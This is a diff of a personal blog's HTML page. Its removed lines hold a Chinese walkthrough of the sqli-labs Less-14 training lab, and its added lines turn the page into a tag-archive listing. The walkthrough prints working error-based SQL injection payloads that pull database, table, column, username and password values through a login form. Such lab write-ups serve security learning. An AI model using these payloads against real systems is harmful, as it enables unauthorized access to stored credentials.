@@ -16,7 +16,7 @@
     <meta name="description" content="Life isn&#39;t about waiting for the storm to pass. It&#39;s about learning to dance in the rain" />
     
     <title>
-      SQL-Labs -14 - Rejeta&#39;s Blog
+      标签 - Rejeta&#39;s Blog
     </title>
     <link rel="manifest" href="/manifest.json" />
     <link rel="shortcut icon" href="/images/logo.jpeg" type="image/x-icon" />
@@ -26,11 +26,6 @@
   <meta name="generator" content="Hexo 5.2.0"></head>
   <body>
     <canvas id='pagemap'></canvas>
-    
-    <div id="post-toc" class="animated hiddenToc hide">
-      <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5"><span class="toc-text">sql-labs通关攻略</span></a></li></ol>
-    </div>
     
     <div id="fixed-menu-wrap">
       <span class="iconfont icon-sousuo search-box menu-reset"></span>
@@ -73,7 +68,7 @@
           分类
         </a>
         
-        <a href="/tags" class="">
+        <a href="/tags" class="current">
           标签
         </a>
         
@@ -127,7 +122,7 @@
             分类
           </a>
           
-          <a href="/tags" class="">
+          <a href="/tags" class="current">
             标签
           </a>
           
@@ -168,101 +163,42 @@
     </div>
     <div id="container">
       <div class="main animated bounceInRight delay-0.7s">
-        <article class="post-entry">
-    <div class="header">
+        <div id="archives">
+    
+        <div class="title">
+            标签 - OS
+        </div>
+    
+
+
+
+
+    
+    
+    <section class="wrap">
+        <div class="meta">
+            <a href="/archives/2020" >
+                2020
+            </a>
+        </div>
+        <div class="year">
+            
+            <article class="item">
+            <a href="/2020/11/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/" title="SQL-Labs -14">
+                <span>2020/11/22</span>
+                <span>SQL-Labs -14</span>
+            </a>
+            </article>
+            
+    
+        </div>
+    </section>
       
-      <div class="title">SQL-Labs -14</div>
-      <div class="meta">
-        <span class="item">
-          <span class="iconfont icon-time-circle"></span>
-          <span>2020/11/21</span>
-        </span>
+<div class="paginator">
+    <span class="page-number current">1</span>
+</div>
+</div>
 
-        
-
-         
-        <span class="item">
-          <span class="iconfont icon-folder"></span>
-          <span>
-              
-                
-                  <a href="/categories/靶场通关">靶场通关</a>
-                
-              
-          </span>
-        </span>
-        
-        
-         
-          <span class="item">
-            <span class="iconfont icon-tag1"></span>
-            <span>
-                
-                  
-                    <a href="/tags/SQL-Labs">SQL-Labs</a>
-                  
-                
-            </span>
-          </span>
-         
-      </div>
-      <div>
-      </div>
-    </div>
-    <html><head></head><body><h2 id="sql-labs通关攻略">sql-labs通关攻略<a class="post-anchor" href="#sql-labs通关攻略"></a></h2><p>首先打开界面观察一下，没有发现标志性的注入点，接下来就是在username和password里面尝试注入，输入探测语句后发现，返回的数据只有正确和错误，很明显的报错注入，接下来就是报错注入的过程了。</p>
-<p>输入</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'</span><br></pre></td></tr></tbody></table></figure>
-<p>发现报错信息中提示了有双引号，于是尝试双引号闭合，发现确实是需要闭合的。</p>
-<p>既然知道了是报错注入，就直接上代码，先找到数据库：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select database()),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_database.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_database.png" alt></a></p>
-<p>然后是数据库中使用的表：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select table_name from information_schema.tables where schema_talbe='security' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_table.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_table.png" alt></a></p>
-<p>接着就是表中的列</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_column.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_column.png" alt></a></p>
-<p>最后找到字段<br>username:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select username from 'users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_username.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_username.png" alt></a><br>password:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select password from 'users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_password.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_password.png" alt></a></p>
-<p>本题结束</p>
-</body></html>
-
-  
-  <div class="post-guide">
-    <div class="item left">
-        
-          <a href="/2020/11/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/">SQL-Labs -14</a>
-        
-    </div>
-    <div class="item right">
-        
-          <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">极客大挑战 Knife</a>
-        
-    </div>
-  </div>
-
-  
-
-  <div class="post-copyright">
-    <div class="auth">
-      本文作者：<a href="http://Diviad-Nick.github.io">Reteja</a>
-    </div>
-    <div class="link">
-      永久链接：<a href="http://Diviad-Nick.github.io/2020/11/21/sql-14/">http://Diviad-Nick.github.io/2020/11/21/sql-14/</a>
-    </div>
-    <div class="declare">
-      版权声明：本文首发于<a href="http://Diviad-Nick.github.io">Reteja</a>的博客，转载请注明出处！
-    </div>
-  </div>
-
-  <div id="comment"></div>
-
-  
-  
-</article>
         <footer>
           <div class="copyright">
             ©2020
